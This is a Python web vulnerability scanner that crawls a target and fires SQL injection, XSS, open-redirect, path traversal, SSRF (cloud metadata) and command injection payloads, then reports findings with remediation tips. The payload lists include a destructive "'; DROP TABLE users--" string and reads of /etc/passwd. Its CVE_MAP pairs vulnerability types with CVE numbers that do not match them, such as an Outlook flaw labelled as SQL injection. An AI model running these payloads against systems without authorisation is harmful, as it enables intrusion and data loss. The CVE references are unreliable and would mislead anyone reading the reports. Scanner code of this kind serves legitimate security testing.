import requests
import json
import asyncio
import aiohttp
from urllib.parse import urlparse, parse_qs
from typing import Callable, Optional
try:
    from .crawler import crawl  # package import
except ImportError:
    from crawler import crawl   # direct execution fallback

REMEDIATIONS = {
    "SQLi": "Use prepared statements and parameterized queries.",
    "XSS": "Encode output and implement CSP headers.",
    "OpenRedirect": "Validate and whitelist redirect URLs.",
    "LFI": "Sanitize file path inputs. Use allowlists.",
    "SSRF": "Whitelist allowed domains and block private IP ranges.",
    "CommandInjection": "Avoid passing user input to system shells. Use safe APIs.",
    "CSRF": "Implement CSRF tokens on all state-changing forms."
}

CVE_MAP = {
    "SQL Injection": { "cve": "CVE-2023-23397", "cwe": "CWE-89", "owasp": "A03:2021 — Injection" },
    "Cross-Site Scripting (XSS)": { "cve": "CVE-2023-32563", "cwe": "CWE-79", "owasp": "A03:2021 — Injection" },
    "Open Redirect": { "cve": "CVE-2023-36845", "cwe": "CWE-601", "owasp": "A01:2021 — Broken Access Control" },
    "Directory Traversal (LFI)": { "cve": "CVE-2023-44487", "cwe": "CWE-22", "owasp": "A01:2021 — Broken Access Control" },
    "Missing CSRF Protection": { "cve": "CVE-2023-29007", "cwe": "CWE-352", "owasp": "A01:2021 — Broken Access Control" },
    "Missing Security Header": { "cve": "N/A", "cwe": "CWE-693", "owasp": "A05:2021 — Security Misconfiguration" },
    "Server-Side Request Forgery (SSRF)": { "cve": "CVE-2023-42282", "cwe": "CWE-918", "owasp": "A10:2021 — Server-Side Request Forgery (SSRF)" },
    "OS Command Injection": { "cve": "CVE-2023-31123", "cwe": "CWE-78", "owasp": "A03:2021 — Injection" }
}

SQLI_PAYLOADS = ["'", '"', "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "'; DROP TABLE users--", "' AND SLEEP(3)--", "1' ORDER BY 1--"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "'><script>alert(1)</script>", "<svg onload=alert(1)>"]
SQLI_ERRORS = ["sql syntax", "mysql_fetch", "ora-01756", "sqlite3", "pg_query", "syntax error", "unclosed quotation", "quoted string not properly terminated", "mysql_num_rows"]

async def fetch(session, url, params=None, timeout=10, allow_redirects=True):
    try:
        async with session.get(url, params=params, timeout=timeout, allow_redirects=allow_redirects) as r:
            text = await r.text()
            return r.status, dict(r.headers), text
    except Exception:
        return 0, {}, ""

async def test_sqli(session, url: str, endpoints: list) -> list:
    vulns = []
    if not endpoints:
        endpoints = [{"url": url, "method": "get", "params": list(parse_qs(urlparse(url).query).keys()) or ["id"]}]
    
    tasks = []
    for ep in endpoints:
        for param in ep["params"]:
            for payload in SQLI_PAYLOADS:
                tasks.append((ep, param, payload, fetch(session, ep["url"], params={param: payload})))
    
    for ep, param, payload, task in tasks:
        status, _, text = await task
        if status == 0: continue
        for err in SQLI_ERRORS:
            if err.lower() in text.lower():
                if not any(v['url'] == ep['url'] and v['param'] == param for v in vulns):
                    vulns.append({
                        "type": "SQL Injection", "url": ep["url"], "method": ep.get("method", "get"),
                        "param": param, "payload": payload, "evidence": err, "severity": "CRITICAL", "cvss": 9.8,
                        "description": f"SQLi detected in parameter '{param}' at {ep['url']}",
                        "remediation": REMEDIATIONS["SQLi"]
                    })
    return vulns

async def test_xss(session, url: str, endpoints: list) -> list:
    vulns = []
    if not endpoints:
        endpoints = [{"url": url, "method": "get", "params": list(parse_qs(urlparse(url).query).keys()) or ["q"]}]
    
    tasks = []
    for ep in endpoints:
        for param in ep["params"]:
            for payload in XSS_PAYLOADS:
                tasks.append((ep, param, payload, fetch(session, ep["url"], params={param: payload})))
                
    for ep, param, payload, task in tasks:
        status, _, text = await task
        if status == 0: continue
        if payload in text:
            if not any(v['url'] == ep['url'] and v['param'] == param for v in vulns):
                vulns.append({
                    "type": "Cross-Site Scripting (XSS)", "url": ep["url"], "method": ep.get("method", "get"),
                    "param": param, "payload": payload, "severity": "HIGH", "cvss": 7.2,
                    "description": f"Reflected XSS in parameter '{param}' at {ep['url']}",
                    "remediation": REMEDIATIONS["XSS"]
                })
    return vulns

async def test_open_redirect(session, url: str, endpoints: list) -> list:
    vulns = []
    if not endpoints:
        endpoints = [{"url": url, "method": "get", "params": list(parse_qs(urlparse(url).query).keys()) or ["redirect"]}]
    payloads = ["https://evil.com", "//evil.com", "/\\evil.com"]
    params_filter = ["redirect", "url", "next", "return", "goto", "dest"]
    
    tasks = []
    for ep in endpoints:
        for param in ep["params"]:
            if param.lower() not in params_filter and param not in endpoints[0]["params"]: continue
            for payload in payloads:
                tasks.append((ep, param, payload, fetch(session, ep["url"], params={param: payload}, allow_redirects=False)))
                
    for ep, param, payload, task in tasks:
        status, headers, _ = await task
        if status in [301, 302, 303, 307, 308]:
            loc = headers.get("Location", "")
            if "evil.com" in loc:
                if not any(v['url'] == ep['url'] and v['param'] == param for v in vulns):
                    vulns.append({
                        "type": "Open Redirect", "url": ep["url"], "method": ep.get("method", "get"),
                        "param": param, "payload": payload, "severity": "MEDIUM", "cvss": 6.1,
                        "description": f"Open redirect via '{param}' parameter at {ep['url']}",
                        "remediation": REMEDIATIONS["OpenRedirect"]
                    })
    return vulns

async def test_directory_traversal(session, url: str, endpoints: list) -> list:
    vulns = []
    if not endpoints:
        endpoints = [{"url": url, "method": "get", "params": list(parse_qs(urlparse(url).query).keys()) or ["file"]}]
    payloads = ["../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd"]
    
    tasks = []
    for ep in endpoints:
        for param in ep["params"]:
            for payload in payloads:
                tasks.append((ep, param, payload, fetch(session, ep["url"], params={param: payload})))
                
    for ep, param, payload, task in tasks:
        status, _, text = await task
        if status == 0: continue
        if "root:x:0:0" in text or "daemon:" in text:
            if not any(v['url'] == ep['url'] and v['param'] == param for v in vulns):
                vulns.append({
                    "type": "Directory Traversal (LFI)", "url": ep["url"], "method": ep.get("method", "get"),
                    "param": param, "payload": payload, "severity": "CRITICAL", "cvss": 9.1,
                    "description": f"LFI detected via '{param}' at {ep['url']}",
                    "remediation": REMEDIATIONS["LFI"]
                })
    return vulns

async def test_ssrf(session, url: str, endpoints: list) -> list:
    vulns = []
    if not endpoints:
        endpoints = [{"url": url, "method": "get", "params": list(parse_qs(urlparse(url).query).keys()) or ["url"]}]
    payloads = ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1", "http://localhost"]
    
    tasks = []
    for ep in endpoints:
        for param in ep["params"]:
            for payload in payloads:
                tasks.append((ep, param, payload, fetch(session, ep["url"], params={param: payload}, timeout=5)))
                
    for ep, param, payload, task in tasks:
        status, _, text = await task
        if status == 200 and ("ami-id" in text or "root:x:" in text or "localhost" in text or "loopback" in text):
            if not any(v['url'] == ep['url'] and v['param'] == param for v in vulns):
                vulns.append({
                    "type": "Server-Side Request Forgery (SSRF)", "url": ep["url"], "method": ep.get("method", "get"),
                    "param": param, "payload": payload, "severity": "HIGH", "cvss": 8.6,
                    "description": f"SSRF detected via '{param}' parameter at {ep['url']}",
                    "remediation": REMEDIATIONS["SSRF"]
                })
    return vulns

async def test_command_injection(session, url: str, endpoints: list) -> list:
    vulns = []
    if not endpoints:
        endpoints = [{"url": url, "method": "get", "params": list(parse_qs(urlparse(url).query).keys()) or ["cmd"]}]
    payloads = ["; cat /etc/passwd", "| cat /etc/passwd", "`cat /etc/passwd`"]
    
    tasks = []
    for ep in endpoints:
        for param in ep["params"]:
            for payload in payloads:
                tasks.append((ep, param, payload, fetch(session, ep["url"], params={param: payload})))
                
    for ep, param, payload, task in tasks:
        status, _, text = await task
        if status == 0: continue
        if "root:x:0:0" in text:
            if not any(v['url'] == ep['url'] and v['param'] == param for v in vulns):
                vulns.append({
                    "type": "OS Command Injection", "url": ep["url"], "method": ep.get("method", "get"),
                    "param": param, "payload": payload, "severity": "CRITICAL", "cvss": 9.8,
                    "description": f"Command Injection detected via '{param}' parameter at {ep['url']}",
                    "remediation": REMEDIATIONS["CommandInjection"]
                })
    return vulns

async def test_csrf(session, url: str) -> list:
    issues = []
    status, _, text = await fetch(session, url)
    if status == 0: return issues
    content = text.lower()
    has_form = "<form" in content
    has_csrf = any(t in content for t in ["csrf", "_token", "authenticity_token"])
    if has_form and not has_csrf:
        issues.append({
            "type": "Missing CSRF Protection", "url": url, "method": "post",
            "severity": "HIGH", "cvss": 8.0,
            "description": "Forms detected without CSRF tokens",
            "remediation": REMEDIATIONS["CSRF"]
        })
    return issues

async def test_headers(session, url):
    issues = []
    status, headers, _ = await fetch(session, url)
    if status == 0: return [{"error": "Connection failed"}]
    
    # aiohttp headers are dict, but we want case-insensitive check.
    headers_lower = {k.lower(): v for k, v in headers.items()}
    checks = {
        "X-Frame-Options":        ("MEDIUM", 5.3, "Clickjacking protection missing", "Add: X-Frame-Options: DENY"),
        "X-Content-Type-Options": ("MEDIUM", 5.3, "MIME sniffing attack possible", "Add: X-Content-Type-Options: nosniff"),
        "Content-Security-Policy":("MEDIUM", 6.1, "No CSP — XSS risk increased", "Define a strict Content-Security-Policy."),
        "Strict-Transport-Security":("MEDIUM", 5.3, "HSTS not enforced", "Add: Strict-Transport-Security: max-age=31536000"),
        "X-XSS-Protection":       ("LOW",    4.3, "Browser XSS filter disabled", "Add: X-XSS-Protection: 1; mode=block"),
        "Referrer-Policy":        ("LOW",    3.1, "Referrer info may leak sensitive data", "Add: Referrer-Policy: no-referrer"),
    }
    for header, (sev, cvss, desc, fix) in checks.items():
        if header.lower() not in headers_lower:
            issues.append({
                "type": "Missing Security Header", "url": url, "method": "get",
                "header": header, "severity": sev, "cvss": cvss, 
                "description": desc, "remediation": fix
            })
    return issues

async def async_run_vuln_scan(url: str, endpoints: list, progress_callback: Optional[Callable] = None) -> dict:
    results = {"target": url, "vulnerabilities": [], "missing_headers": []}
    
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        if progress_callback: progress_callback(3, "Testing SQL Injection...")
        results["vulnerabilities"] += await test_sqli(session, url, endpoints)
        
        if progress_callback: progress_callback(4, "Testing XSS...")
        results["vulnerabilities"] += await test_xss(session, url, endpoints)
        
        if progress_callback: progress_callback(5, "Testing SSRF...")
        results["vulnerabilities"] += await test_ssrf(session, url, endpoints)
        
        if progress_callback: progress_callback(6, "Testing Command Injection...")
        results["vulnerabilities"] += await test_command_injection(session, url, endpoints)
        
        if progress_callback: progress_callback(7, "Checking Open Redirects...")
        results["vulnerabilities"] += await test_open_redirect(session, url, endpoints)
        
        if progress_callback: progress_callback(8, "Testing Directory Traversal...")
        results["vulnerabilities"] += await test_directory_traversal(session, url, endpoints)
        
        if progress_callback: progress_callback(9, "Testing CSRF...")
        results["vulnerabilities"] += await test_csrf(session, url)
        
        if progress_callback: progress_callback(10, "Auditing Security Headers...")
        results["missing_headers"] = await test_headers(session, url)
        
    return results

def run_vuln_scan(url: str, progress_callback: Optional[Callable] = None) -> dict:
    print(f"[*] Starting vulnerability scan on {url}...")
    
    if progress_callback: progress_callback(2, "Crawling for endpoints...")
    print("[*] Crawling endpoints...")
    endpoints = crawl(url)
    
    # Run all async scanning logic
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    results = loop.run_until_complete(async_run_vuln_scan(url, endpoints, progress_callback))
    loop.close()
    
    results["endpoints"] = endpoints
    
    total = len(results["vulnerabilities"]) + len(results["missing_headers"])
    for v in results["vulnerabilities"] + results["missing_headers"]:
        vtype = v.get("type", "")
        for key, cve_data in CVE_MAP.items():
            if key in vtype:
                v.update(cve_data)
                break
                
    print(f"[+] Scan complete — {total} issues found")
    return results

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    result = run_vuln_scan(target)
    print(json.dumps(result, indent=2))